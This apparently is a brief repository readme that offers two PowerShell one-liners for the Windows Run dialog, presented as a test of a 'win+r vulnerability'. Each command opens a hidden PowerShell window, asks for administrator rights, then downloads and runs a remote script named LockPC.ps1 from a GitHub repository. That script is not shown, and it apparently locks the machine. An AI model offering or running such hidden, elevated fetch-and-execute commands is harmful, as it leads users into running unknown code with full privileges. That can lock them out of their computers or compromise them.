Test win+r vulnerability by running the script from the web

WIN+R --> ```powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Maximized -Command iex(irm ''https://raw.githubusercontent.com/UsernameLoxotron/Powershell-Lock-Script/refs/heads/main/LockPC.ps1'')'"```
or
```powershell -WindowStyle Hidden -Command "Start-Process powershell -Verb RunAs -ArgumentList '-WindowStyle Maximized -Command iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/UsernameLoxotron/Powershell-Lock-Script/refs/heads/main/LockPC.ps1')"```
